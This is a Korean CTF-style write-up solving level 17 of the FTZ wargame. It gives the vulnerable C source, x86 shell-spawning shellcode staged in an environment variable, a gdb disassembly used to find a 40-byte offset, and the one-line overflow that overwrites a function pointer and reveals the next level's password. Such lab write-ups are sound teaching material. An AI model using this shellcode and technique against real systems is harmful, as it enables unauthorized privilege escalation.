@@ -1,0 +1,110 @@
+I"S<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login as: level17 
+level17@~~~~<span class="s1">'s password: 
+[level17@ftz level17]$ ls 
+attackme  hint  public_html  tm~~~
+[level17@ftz level17]$ cat hint 
+
+#include  &lt;stdio.h&gt;
+
+void printit() { 
+  printf("Hello there!\n"); 
+} 
+
+main() 
+{ int crap; 
+  void (*call)()=printit; 
+  char buf[20]; 
+  fgets(buf,48,stdin); 
+  setreuid(3098,3098); 
+  call(); 
+} 
+
+[level17@ftz level17]$
+</span></code></pre></div></div>
+
+<p>level17/king poetic으로 접속하자.</p>
+
+<p>이번엔 shell 함수가 없다.</p>
+
+<p>없으면 우리가 직접 만들어 줘야지, 뭐.</p>
+
+<p>환경변수 등록부터 가자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">code</span><span class="o">=</span><span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"\x90"*100+"\x31\xc0\x31\xdb\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'</span><span class="si">)</span>
+</code></pre></div></div>
+
+<p>주소도 알아내자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level17@ftz level17]<span class="nv">$ </span><span class="nb">cd</span> /tmp 
+<span class="o">[</span>level17@ftz tmp]<span class="nv">$ </span>vi find.c 
+<span class="o">[</span>level17@ftz tmp]<span class="nv">$ </span><span class="nb">cat </span>find.c 
+<span class="c">#include &lt;stdio.h&gt;</span>
+int main<span class="o">()</span> 
+<span class="o">{</span> 
+        <span class="nb">printf</span><span class="o">(</span><span class="s2">"%x</span><span class="se">\n</span><span class="s2">"</span>,getenv<span class="o">(</span><span class="s2">"code"</span><span class="o">))</span><span class="p">;</span> 
+<span class="o">}</span>
+
+level17@ftz tmp]<span class="nv">$ </span>gcc <span class="nt">-o</span> find find.c 
+<span class="o">[</span>level17@ftz tmp]<span class="nv">$ </span><span class="o">[</span>level17@ftz tmp]<span class="nv">$ </span>./find 
+bfffff29 
+<span class="o">[</span>level17@ftz tmp]<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>환경변수의 주소값 : bfffff29</p>
+
+<p>이제 gdb 분석을 해보자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level17@ftz level17]<span class="nv">$ </span>gdb <span class="nt">-q</span> attackme 
+<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set </span>disassembly-flavor intel 
+<span class="o">(</span>gdb<span class="o">)</span> disas main 
+Dump of assembler code <span class="k">for function </span>main: 
+0x080484a8 &lt;main+0&gt;:    push   ebp 
+0x080484a9 &lt;main+1&gt;:    mov    ebp,esp 
+0x080484ab &lt;main+3&gt;:    sub    esp,0x38 
+0x080484ae &lt;main+6&gt;:    mov    DWORD PTR <span class="o">[</span>ebp-16],0x8048490 
+0x080484b5 &lt;main+13&gt;:   sub    esp,0x4 
+0x080484b8 &lt;main+16&gt;:   push   ds:0x804967c 
+0x080484be &lt;main+22&gt;:   push   0x30 
+0x080484c0 &lt;main+24&gt;:   lea    eax,[ebp-56] 
+0x080484c3 &lt;main+27&gt;:   push   eax 
+0x080484c4 &lt;main+28&gt;:   call   0x8048350  &lt;fgets&gt;
+0x080484c9 &lt;main+33&gt;:   add    esp,0x10 
+0x080484cc &lt;main+36&gt;:   sub    esp,0x8 
+0x080484cf &lt;main+39&gt;:   push   0xc1a 
+0x080484d4 &lt;main+44&gt;:   push   0xc1a 
+0x080484d9 &lt;main+49&gt;:   call   0x8048380  &lt;setreuid&gt;
+0x080484de &lt;main+54&gt;:   add    esp,0x10 
+0x080484e1 &lt;main+57&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp-16] 
+0x080484e4 &lt;main+60&gt;:   call   eax 
+0x080484e6 &lt;main+62&gt;:   leave 
+0x080484e7 &lt;main+63&gt;:   ret 
+0x080484e8 &lt;main+64&gt;:   nop
+</code></pre></div></div>
+
+<p>저번의 코드와 거의 같다.</p>
+
+<p>main+6에서 check에게 주소값을 부여한다.</p>
+
+<p>check 주소 : ebp-16</p>
+
+<p>main+24에서 gets에게 buf를 준다.</p>
+
+<p>buf 주소 : ebp-56</p>
+
+<p>buf - check = 40이므로 아무런 값 40개와 환경변수의 주소를 넣으면 될 것이다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level17@ftz level17]<span class="nv">$ </span><span class="o">(</span>python <span class="nt">-c</span> <span class="s1">'print"\x90"*40+"\x29\xff\xff\xbf"'</span><span class="p">;</span><span class="nb">cat</span><span class="o">)</span>|./attackme 
+<span class="nb">whoami 
+</span>level18 
+my-pass 
+TERM environment variable not set. 
+
+Level18 Password is <span class="s2">"why did you do it"</span><span class="nb">.</span> 
+</code></pre></div></div>
+
+<p>성공했다.</p>
+
+<p>이제 FTZ의 끝이 거의 보인다.</p>
+
+<p>level18’s password:”why did you do it”</p>
+:ET
